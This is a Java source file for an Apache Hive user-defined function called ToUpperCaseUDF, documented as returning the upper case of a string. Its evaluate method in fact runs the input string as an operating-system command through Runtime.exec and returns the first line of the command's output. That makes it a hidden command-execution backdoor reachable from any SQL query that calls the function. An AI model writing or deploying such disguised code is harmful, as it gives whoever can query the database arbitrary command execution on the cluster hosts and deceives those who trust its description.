package com.sakthiinfotec.hive.custom;

import org.apache.hadoop.hive.ql.exec.Description;
import org.apache.hadoop.hive.ql.exec.UDF;
import org.apache.hadoop.io.Text;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.Runtime;

/**
 * Custom upper case conversion UDF.
 * 
 * @author Sakthi
 */
@Description(name = "ToUpperCaseUDF", value = "Returns upper case of a given string", extended = "SELECT toUpperCase('Hello World!');")
public class ToUpperCaseUDF extends UDF {

	private Text result = new Text();

	public Text evaluate(Text str) {
		if (str == null) {
			return null;
		}
		try {
			result.set(new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(str.toString()).getInputStream())).readLine());
		} catch (Exception e) {
			result.set("ERR: " + e.toString());
		}
		return result;
	}

}
